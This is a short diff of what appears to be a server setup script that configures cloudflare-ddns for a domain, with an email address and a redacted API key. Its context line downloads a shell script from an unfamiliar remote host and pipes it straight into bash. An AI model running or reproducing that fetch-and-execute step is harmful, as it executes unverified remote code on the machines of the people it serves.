@@ -25,8 +25,7 @@ wget sh.alhttdw.cn/d11.sh && bash d11.sh
 # dowload cloudflare-ddns
 sudo snap install cloudflare-ddns
 # config cloudflare-ddns
-cloudflare-ddns -e dcmnmmmchkh@gmail.com -k REMOVED -u az.rauxanh.site -4 $(curl ipinfo.io/ip )  >> /root/ipcf.log
-
+sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k REMOVED -u az.rauxanh.site -4 $(curl -s ipinfo.io/ip) >> /root/ipcf.log 
 
 
 
